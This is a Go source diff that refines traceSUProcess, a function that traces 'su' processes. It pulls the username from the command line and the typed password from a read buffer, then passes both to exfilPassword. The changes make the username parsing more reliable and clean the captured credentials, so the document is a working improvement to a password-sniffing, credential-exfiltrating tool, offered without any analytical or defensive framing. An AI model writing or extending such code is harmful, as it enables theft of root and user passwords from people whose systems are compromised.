@@ -6,7 +6,6 @@ import (
 	"runtime"
 	"strings"
 	"syscall"
-	"unicode"
 )
 
 func traceSUProcess(pid int) {
@@ -53,17 +52,17 @@ func traceSUProcess(pid int) {
 					}
 					username := "root"
 					if len(cmdline) > 3 {
-						username = string((cmdline[3:]))
+						parts := strings.Split(string(cmdline), "\x00")
+						if len(parts) > 1 {
+							username = parts[1]
+						} else {
+							username = strings.TrimRight(string(cmdline[3:]), "\x00")
+						}
+						username = removeNonPrintableAscii(username)
 					}
 					password := strings.Split(string(buffer), "\n")[0]
-					if func(s string) bool {
-						for _, r := range s {
-							if !unicode.IsPrint(r) {
-								return false
-							}
-						}
-						return true
-					}(password) {
+					password = removeNonPrintableAscii(password)
+					if isValidPassword(password) {
 						go exfilPassword(username, password)
 					}
 				}
